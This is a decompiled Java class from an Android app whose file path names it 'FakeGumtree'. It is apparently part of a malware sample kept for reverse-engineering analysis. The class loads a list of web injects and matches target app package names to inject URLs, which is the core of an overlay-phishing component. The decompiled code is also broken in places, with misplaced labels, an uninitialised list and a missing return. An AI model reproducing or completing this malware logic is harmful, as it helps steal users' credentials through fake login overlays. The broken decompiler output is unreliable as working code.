package com.gumsis.wb;

import com.gumsis.Realtalk;
import com.gumsis.checktls.Print;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;

public class WITools
{
  static String changeWEBInjJSONbyPkg(String paramString)
    throws Exception
  {
    JSONArray localJSONArray1 = new JSONArray();
    if (Realtalk.injWI != null)
    {
      int i = 0;
      while (i < Realtalk.injWI.size())
      {
        Object localObject = (Inj)Realtalk.injWI.get(i);
        if (localObject != null)
        {
          JSONObject localJSONObject1 = new JSONObject();
          localJSONObject1.put("name", ((Inj)localObject).getName());
          localJSONObject1.put("type", ((Inj)localObject).getType());
          localJSONObject1.put("link", ((Inj)localObject).getLink());
          JSONArray localJSONArray2 = new JSONArray();
          localObject = ((Inj)localObject).getApps();
          if (localObject != null)
          {
            int j = 0;
            if (j < ((List)localObject).size())
            {
              App localApp = (App)((List)localObject).get(j);
              JSONObject localJSONObject2;
              if (localApp != null)
              {
                localJSONObject2 = new JSONObject();
                if (localApp.getPkg().equals(paramString)) {
                  break label226;
                }
              }
              label226:
              for (boolean bool = true;; bool = false)
              {
                localJSONObject2.put("check", bool);
                localJSONObject2.put("package", localApp.getPkg());
                localJSONArray2.put(localJSONObject2);
                localJSONObject1.put("apps", localJSONArray2);
                localJSONArray1.put(localJSONObject1);
                j += 1;
                break;
              }
            }
          }
        }
        i += 1;
      }
    }
    return localJSONArray1.toString();
  }
  
  private static String equalsPkgs(String paramString, Inj paramInj)
    throws Exception
  {
    List localList = paramInj.getApps();
    if (localList != null)
    {
      int i = 0;
      while (i < localList.size())
      {
        App localApp = (App)localList.get(i);
        if ((localApp != null) && (localApp.isCheck()) && (paramString.equals(localApp.getPkg()))) {
          return paramInj.getLink();
        }
        i += 1;
      }
    }
    return null;
  }
  
  public static String getWEBInjectUrl(String paramString)
    throws Exception
  {
    if (Realtalk.injWI != null)
    {
      int i = 0;
      while (i < Realtalk.injWI.size())
      {
        Object localObject = (Inj)Realtalk.injWI.get(i);
        if (localObject != null)
        {
          localObject = equalsPkgs(paramString, (Inj)localObject);
          if (localObject != null) {
            return (String)localObject;
          }
        }
        i += 1;
      }
    }
    return null;
  }
  
  public static List<Inj> parseWEBInjJson(String paramString)
  {
    localArrayList = new ArrayList();
    if (paramString != null) {
      try
      {
        paramString = new JSONArray(paramString);
        int i = 0;
        while (i < paramString.length())
        {
          JSONObject localJSONObject = paramString.getJSONObject(i);
          if (localJSONObject != null) {
            localArrayList.add(new Inj(localJSONObject.getString("name"), localJSONObject.getString("type"), localJSONObject.getString("link"), localJSONObject.getJSONArray("apps")));
          }
          i += 1;
        }
        return localArrayList;
      }
      catch (Exception paramString)
      {
        Print.e(paramString.toString());
      }
    }
  }
  
  private static class App
  {
    private boolean check;
    private String pkg;
    
    App(boolean paramBoolean, String paramString)
      throws Exception
    {
      this.check = paramBoolean;
      this.pkg = paramString;
    }
    
    String getPkg()
    {
      return this.pkg;
    }
    
    public boolean isCheck()
    {
      return this.check;
    }
    
    public void setCheck(boolean paramBoolean)
    {
      this.check = paramBoolean;
    }
    
    public void setPkg(String paramString)
    {
      this.pkg = paramString;
    }
  }
  
  public static class Inj
  {
    private List<WITools.App> apps = new ArrayList();
    private String link;
    private String name;
    private String type;
    
    Inj(String paramString1, String paramString2, String paramString3, JSONArray paramJSONArray)
      throws Exception
    {
      this.name = paramString1;
      this.type = paramString2;
      this.link = paramString3;
      setApps(paramJSONArray);
    }
    
    List<WITools.App> getApps()
    {
      return this.apps;
    }
    
    public String getLink()
    {
      return this.link;
    }
    
    public String getName()
    {
      return this.name;
    }
    
    public String getType()
    {
      return this.type;
    }
    
    void setApps(JSONArray paramJSONArray)
      throws Exception
    {
      int i = 0;
      while (i < paramJSONArray.length())
      {
        Object localObject = paramJSONArray.getJSONObject(i);
        if (localObject != null)
        {
          localObject = new WITools.App(((JSONObject)localObject).getBoolean("check"), ((JSONObject)localObject).getString("package"));
          this.apps.add(localObject);
        }
        i += 1;
      }
    }
    
    public void setLink(String paramString)
    {
      this.link = paramString;
    }
    
    public void setName(String paramString)
    {
      this.name = paramString;
    }
    
    public void setType(String paramString)
    {
      this.type = paramString;
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/wb/WITools.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */